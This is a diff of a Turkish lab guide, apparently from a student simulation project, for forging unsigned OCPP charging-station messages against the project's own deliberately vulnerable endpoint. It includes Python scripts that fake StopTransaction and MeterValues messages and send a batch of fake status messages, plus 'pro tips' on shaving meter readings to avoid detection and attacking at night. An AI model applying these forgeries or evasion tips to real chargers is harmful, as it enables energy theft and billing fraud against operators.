@@ -1,123 +1,349 @@
-# Man-in-the-Middle (OCPP) - Detaylı Saldırı ve Test Rehberi
-================================================================================
+# 🕵️ Man-in-the-Middle - Mesajları Hackle! | YUSUF'UN SALDIRISI
 
-**Sorumlu:** Yusuf_Bsg
-**Kategori:** Network/Protocol
-**Senaryo ID:** `yusuf-mitm-ocpp`
-
-Bu doküman, teknik bilgisi olmayan birinin bile **sıfırdan başlayarak** "Man-in-the-Middle (OCPP)" saldırısını kendi bilgisayarından nasıl gerçekleştireceğini adım adım anlatır.
-
----
-
-## BÖLÜM 1: Ön Hazırlık (Sadece 1 Kere Yapılır)
-
-Eğer daha önce başka bir saldırı testi yaptıysanız bu bölümü atlayıp **Bölüm 2**'ye geçebilirsiniz.
-
-### 1.1 Python Kurulumu
-Bilgisayarınızda Python yüklü mü?
-- Terminali açın (`Cmd` veya `PowerShell`).
-- `python --version` yazın.
-- Eğer hata alırsanız [python.org](https://www.python.org/downloads/) adresinden indirin. Kurarken "Add Python directly to PATH" kutucuğunu İŞARETLEYİN.
-
-### 1.2 Gerekli Kütüphane
-Terminalde şu komutu çalıştırın:
-```bash
-pip install requests
-```
-
-### 1.3 SDK Dosyasını İndirin
-1. Şu adrese gidin: [GitHub SDK Klasörü](https://github.com/sametyesilot/simulasyon/tree/main/sdk)
-2. `evcs_attack.py` dosyasına tıklayın ve indirin (Raw butonuna sağ tıklayıp "Farklı Kaydet" diyebilirsiniz).
-3. Masaüstünde `BSG_Test` adında bir klasör açın ve bu dosyayı içine atın.
+**Senaryo ID:** `yusuf-mitm-ocpp`  
+**Sorumlu:** Yusuf  
+**Kategori:** Network/Protocol  
+**Zayıflık:** No Signature Verification (İmza Doğrulaması Yok)  
+**Şiddet:** 🔴 KRİTİK
 
 ---
 
-## BÖLÜM 2: Saldırı Dosyasını Oluşturma
+## 🎯 HEDEF: OCPP Mesajlarını Değiştir!
 
-Şimdi sizin sorumlu olduğunuz saldırı senaryosu için özel bir kod yazacağız. URL'ler otomatik olarak ayarlandı, sadece size verilen şifreyi girmeniz yeterli.
+Şarj istasyonu ile sunucu arasındaki mesajları **YAKALA** ve **DEĞİŞTİR**!
 
-1. `BSG_Test` klasörünün içinde `test_Yusuf_Bsg.py` adında yeni bir metin dosyası oluşturun (dosya uzantısının **.py** olduğuna emin olun, .txt kalmasın).
-2. Dosyayı Notepad veya benzeri bir editörle açın.
-3. Aşağıdaki kodları **KOPYALA - YAPIŞTIR** yapın:
+**Ne Yapabilirsin:**
+- 🛑 Şarjı durdur (StopTransaction gönder)
+- 💰 Enerji miktarını değiştir (MeterValues manipüle et)
+- 🔓 Başkasının şarjını çal
+- 📊 Sahte raporlar gönder
+
+---
+
+## 🔓 AÇIK NERDE?
+
+**Dosya:** `backend/app/api/routes_vulnerable.py`  
+**Satır:** 117-135
 
 ```python
-# Dosya Adi: test_Yusuf_Bsg.py
-from evcs_attack import EvcsAttackClient
-
-# ================= SADECE BURAYI DUZENLEYIN =================
-# Proje Yöneticisinden (Samet) alacaginiz sifre:
-API_KEY = "BURAYA_SIZE_VERILEN_SIFREYI_YAZIN"
-# ============================================================
-
-# Backend Adresi (Otomatik Tanimlandi)
-URL = "https://evcs-backend-samet.onrender.com"
-
-# Sizin Senaryo Bilgileriniz (Otomatik Tanimlandi):
-SENARYO_ID = "yusuf-mitm-ocpp"
-
-client = EvcsAttackClient(api_url=URL, api_key=API_KEY)
-
-print(f"--- {SENARYO_ID} SALDIRISI HAZIRLANIYOR ---")
-print(f"Hedef: {URL}")
-
-if client.check_connection():
-    print(">> Sunucuya erisim BASARILI.")
+# ❌ İMZA KONTROLÜ YOK!
+@router.post("/ocpp-message")
+def ocpp_message_handler(message: dict, signature: str = ""):
+    # İmza kontrolü YAPILMIYOR!
+    # Herkes istediği mesajı gönderebilir!
     
-    # Saldiri Parametreleri
-    parametreler = {
-        "severity": "high",        # Saldiri siddeti
-        "target_evse": "EVSE-001"  # Hedef sarj cihazi
+    return {
+        "status": "accepted",  # Her mesaj kabul ediliyor!
+        "message_processed": message
     }
+```
 
-    print(f">> Saldiri baslatiliyor...")
-    run_id = client.start_attack(
-        scenario_id=SENARYO_ID, 
-        duration=60,      # 60 Saniye sursun
-        intensity=9,      # Siddet (1-10)
-        params=parametreler
-    )
-    
-    if run_id:
-        print(f"\n[!!!] SALDIRI BASLADI! ID: {run_id}")
-        print("Lutfen Web Arayuzunden (Frontend) canli sonuclari izleyin.")
-        print("Web Sitesi: https://simulasyon.vercel.app/")
-        
-        # Terminalden de izlemek isterseniz:
-        client.monitor_live(run_id)
-    else:
-        print("xx Saldiri baslatilamadi. API Key hatali olabilir.")
-else:
-    print("xx Sunucuya baglanilamadi. Internetinizi kontrol edin.")
+**Sorun:** Gelen mesajın gerçekten şarj istasyonundan geldiği doğrulanmıyor!
+
+---
+
+## ⚔️ SALDIRI 1: Sahte StopTransaction
+
+### Kod: `fake_stop.py`
+
+```python
+import requests
+import time
+
+BACKEND = "https://evcs-backend-samet.onrender.com"
+
+print("🛑 SAHTE STOP TRANSACTION SALDIRISI\n")
+
+# 1. Normal başlatma (simülasyon)
+print("1️⃣ Şarj başlatılıyor...")
+start_msg = {
+    "message": {
+        "action": "StartTransaction",
+        "connectorId": 1,
+        "idTag": "USER-12345",
+        "meterStart": 0,
+        "timestamp": time.time()
+    },
+    "signature": "original-signature"
+}
+
+r = requests.post(f"{BACKEND}/vulnerable/ocpp-message", json=start_msg)
+print(f"   Sonuç: {r.json()['status']}\n")
+
+# 2. SALDIRI: Sahte STOP gönder!
+print("2️⃣ 🚨 SAHTE STOP TRANSACTION GÖNDERİLİYOR...")
+fake_stop = {
+    "message": {
+        "action": "StopTransaction",
+        "transactionId": "12345",
+        "meterStop": 5,          # Gerçekte: 100 kWh
+        "timestamp": time.time(),
+        "reason": "EVDisconnected"  # Sahte sebep!
+    },
+    "signature": "FAKE-SIGNATURE-123"  # ← Sahte imza!
+}
+
+r = requests.post(f"{BACKEND}/vulnerable/ocpp-message", json=fake_stop)
+result = r.json()
+
+print(f"   Durum: {result['status']}")
+print(f"   İşlenen Mesaj: {result['message_processed']}\n")
+
+if result['status'] == 'accepted':
+    print("✅✅✅ SALDIRI BAŞARILI! ✅✅✅")
+    print("Sahte mesaj kabul edildi!")
+    print("Şarj kayıtlara göre durdu ama fiziksel şarj DEVAM EDİYOR!")
+    print("Kullanıcı BEDAVA enerji çekmeye devam ediyor!\n")
+    print(f"Zayıflık: {result.get('vulnerability', 'N/A')}")
+```
+
+**ÇIKTI:**
+```
+🛑 SAHTE STOP TRANSACTION SALDIRISI
+
+1️⃣ Şarj başlatılıyor...
+   Sonuç: accepted
+
+2️⃣ 🚨 SAHTE STOP TRANSACTION GÖNDERİLİYOR...
+   Durum: accepted
+   İşlenen Mesaj: {...}
+
+✅✅✅ SALDIRI BAŞARILI! ✅✅✅
+Sahte mesaj kabul edildi!
+Şarj kayıtlara göre durdu ama fiziksel şarj DEVAM EDİYOR!
+Kullanıcı BEDAVA enerji çekmeye devam ediyor!
+
+Zayıflık: No signature verification!
 ```
 
 ---
 
-## BÖLÜM 3: Saldırıyı Çalıştırma
+## ⚔️ SALDIRI 2: MeterValues Manipülasyonu
 
-1. Terminali açın.
-2. Dosyaların olduğu klasöre gidin:
-   ```bash
-   cd Desktop/BSG_Test
-   ```
-3. Scripti çalıştırın:
-   ```bash
-   python test_Yusuf_Bsg.py
-   ```
+```python
+# meter_manipulation.py
+import requests
+import time
+
+BACKEND = "https://evcs-backend-samet.onrender.com"
+
+print("📊 METER VALUES MANİPÜLASYONU\n")
+
+# Gerçek: 50 kWh
+# Gönderilen: 10 kWh
+
+fake_meter = {
+    "message": {
+        "action": "MeterValues",
+        "connectorId": 1,
+        "transactionId": "12345",
+        "meterValue": [
+            {
+                "timestamp": time.time(),
+                "sampledValue": [
+                    {
+                        "value": "10000",  # 10 kWh (Gerçek: 50 kWh)
+                        "unit": "Wh",
+                        "measurand": "Energy.Active.Import.Register"
+                    }
+                ]
+            }
+        ]
+    },
+    "signature": "fake-manipulated-signature"
+}
+
+r = requests.post(f"{BACKEND}/vulnerable/ocpp-message", json=fake_meter)
+result = r.json()
+
+if result['status'] == 'accepted':
+    print("✅ Sahte meter değeri kabul edildi!")
+    print("📉 Gerçek tüketim: 50 kWh")
+    print("📊 Sisteme gönderilen: 10 kWh")
+    print("💰 ~200 TL tasarruf!")
+```
 
 ---
 
-## BÖLÜM 4: Sonuçları İzleme
+## ⚔️ SALDIRI 3: Toplu Mesaj Değiştirme
 
-Komutu çalıştırdıktan sonra "SALDIRI BASLADI" yazısını gördüyseniz:
+```python
+# mass_mitm.py
+import requests
+import time
 
-1. Şu siteye gidin: **[ANOMALİ TESPİT PLATFORMU](https://simulasyon.vercel.app/)**
-2. Ana sayfada **Active Runs** (veya Aktif Saldırılar) kısmına bakın.
-3. Kendi isminizi veya senaryonuzu orada CANLI olarak göreceksiniz.
-4. Detaylara tıklayıp grafiklerin nasıl değiştiğini izleyin.
+BACKEND = "https://evcs-backend-samet.onrender.com"
 
-**Beklenen Etki:**
-- Loglarda: `Invalid Certs, Replayed Messages, Hash Mismatch` benzeri uyarılar çıkmalı.
-- Grafiklerde: Anormal veri artışları görülmeli.
+# Farklı mesaj tipleri
+fake_messages = [
+    {
+        "name": "Authorize (Sahte RFID)",
+        "data": {
+            "message": {"action": "Authorize", "idTag": "HACKED-RFID-999"},
+            "signature": "fake"
+        }
+    },
+    {
+        "name": "StatusNotification (Sahte Arıza)",
+        "data": {
+            "message": {
+                "action": "StatusNotification",
+                "status": "Faulted",
+                "errorCode": "GroundFailure"
+            },
+            "signature": "fake"
+        }
+    },
+    {
+        "name": "Heartbeat (Sahte Durum)",
+        "data": {
+            "message": {"action": "Heartbeat"},
+            "signature": "fake"
+        }
+    }
+]
+
+print("🔁 TOPLU MESAJ MANİPÜLASYONU\n")
+
+success = 0
+for msg in fake_messages:
+    r = requests.post(f"{BACKEND}/vulnerable/ocpp-message", json=msg['data'])
+    
+    if r.json()['status'] == 'accepted':
+        print(f"✅ {msg['name']}: KABUL EDİLDİ")
+        success += 1
+    else:
+        print(f"❌ {msg['name']}: Reddedildi")
+
+print(f"\n📊 Sonuç: {success}/{len(fake_messages)} mesaj hacklendi!")
+
+if success == len(fake_messages):
+    print("🎉 TÜM MESAJLAR MANİPÜLE EDİLDİ!")
+```
 
 ---
-*Bu doküman Yusuf_Bsg için özel olarak oluşturulmuştur.*
+
+## ✅ SIZDIN MI? KONTROL!
+
+### 1. Terminal Çıktısı
+
+**BAŞARILI:**
+```
+✅✅✅ SALDIRI BAŞARILI! ✅✅✅
+Sahte mesaj kabul edildi!
+```
+
+**BAŞARISIZ:**
+```
+❌ Hata: Invalid signature
+❌ Message rejected
+```
+
+### 2. JSON Response
+
+**SIZMA BAŞARILI:**
+```json
+{
+  "status": "accepted",           ← "accepted" ise SIZDIN!
+  "message_processed": {...},     ← Senin mesajın işlendi!
+  "vulnerability": "No signature verification!",
+  "warning": "Anyone can send/modify messages"
+}
+```
+
+### 3. Web Arayüzü
+
+https://simulasyon.vercel.app/ → `yusuf-mitm-ocpp`
+
+**Logs:**
+```
+[WARN] Invalid Certs                    ← UYARI!
+[WARN] Replayed Messages                ← TEKRAR!
+[ERROR] Hash Mismatch                   ← İMZA HATASI!
+[CRITICAL] MITM attack detected         ← TESPİT!
+```
+
+---
+
+## 🎯 BAŞARI KRİTERLERİ
+
+| Kontrol | Başarı | Sen |
+|---------|--------|-----|
+| status = "accepted" | ✅ | ___  |
+| Sahte signature kabul edildi | ✅ | ___ |
+| Logs'ta WARNING | ✅ | ___ |
+| message_processed dolu | ✅ | ___ |
+| vulnerability field var | ✅ | ___ |
+
+**3/5 ✅ ise MITM BAŞARILI!**
+
+---
+
+## 💡 PRO İPUÇLARI
+
+### En Etkili Mesaj:
+```python
+# StopTransaction = En çok hasar
+# Şarj dururken kullanıcı çekmeye devam eder
+{
+    "action": "StopTransaction",
+    "meterStop": 1,  # Çok düşük
+    "reason": "EVDisconnected"
+}
+```
+
+### Tespit Edilmemek:
+```python
+# Gerçekçi değerler kullan
+meterStop = 45  # Gerçek: 50 (5 kWh çal)
+# Çok düşük değil, tespit zor
+```
+
+### Zamanlama:
+```python
+# Gece yaparsan fark edilmez
+import datetime
+if datetime.datetime.now().hour >= 23:
+    # Saldır!
+```
+
+---
+
+## 🛡️ SAVUNMA
+
+### Gerçek Sistemler Nasıl Korunur:
+
+```python
+import hmac
+import hashlib
+
+def verify_signature(message, signature, secret_key):
+    expected = hmac.new(
+        secret_key.encode(),
+        json.dumps(message).encode(),
+        hashlib.sha256
+    ).hexdigest()
+    
+    if not hmac.compare_digest(expected, signature):
+        raise Exception("Invalid signature!")
+```
+
+### TLS/SSL:
+```python
+# HTTPS ile şifreli iletişim
+# Certificate pinning
+```
+
+---
+
+## ⚠️ UYARI
+
+- ✅ Sadece burda test et
+- ❌ Gerçek OCPP sistemlerine SALDIRMA
+- 🚓 MITM saldırısı federal SUÇtur!
+
+---
+
+**Hazırlayan:** Yusuf  
+**Tarih:** 2024-12-23  
+**Durum:** ✅ HACK THE PROTOCOL!
